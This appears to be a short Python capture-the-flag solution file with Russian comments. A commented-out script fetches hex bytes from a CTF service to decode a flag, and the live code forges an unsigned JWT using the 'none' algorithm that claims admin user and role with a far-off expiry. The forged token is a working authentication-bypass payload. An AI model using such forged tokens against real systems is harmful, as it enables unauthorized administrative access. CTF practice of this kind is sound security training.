# import requests
# import re
#
#
# def solve():
#     BASE_URL = "http://ctfinf.ru:10001"  # URL сервиса
#
#     # Позиции из encrypted.txt
#     positions = [150, 108, 71, 620, 132, 174, 508, 217, 765, 17, 54, 132, 54, 189, 307, 17, 177, 54, 455, 217, 17, 129,
#                  453, 2, 17, 643, 37, 236, 187, 246, 17, 31, 453, 54, 57]
#
#     hex_bytes = []
#
#     print("Дешифровка флага...")
#     for i, pos in enumerate(positions):
#         try:
#             r = requests.get(f"{BASE_URL}/get_by_pos", params={"pos": pos}, timeout=5)
#             r.raise_for_status()
#
#             # Убираем кавычки из ответа
#             hex_byte = r.text.strip('"')
#             hex_bytes.append(hex_byte)
#             print(f"[{i + 1}/{len(positions)}] Позиция {pos} -> '{hex_byte}'")
#
#         except requests.RequestException as e:
#             print(f"Ошибка при получении позиции {pos}: {e}")
#             hex_bytes.append("00")
#
#     # Склеиваем все байты
#     hex_string = "".join(hex_bytes)
#     print(f"\nПолученная hex строка: {hex_string}")
#
#     # Переводим hex в текст
#     try:
#         flag = bytes.fromhex(hex_string).decode("utf-8")
#         print(f"\n🎉 Флаг: {flag}")
#     except Exception as e:
#         print(f"Ошибка декодирования: {e}")
#
#         # Покажем что пошло не так
#         print("\nАнализ hex строки:")
#         for i in range(0, len(hex_string), 2):
#             hex_pair = hex_string[i:i + 2]
#             try:
#                 char = bytes.fromhex(hex_pair).decode("utf-8")
#                 print(f"  {hex_pair} -> '{char}'")
#             except:
#                 print(f"  {hex_pair} -> ERROR")
#
#
# if __name__ == "__main__":
#     solve()
import jwt

payload = {
    "user": "admin",
    "role": "admin",
    "exp": 99999999999
}

token = jwt.encode(payload, key="", algorithm="none")
print(token)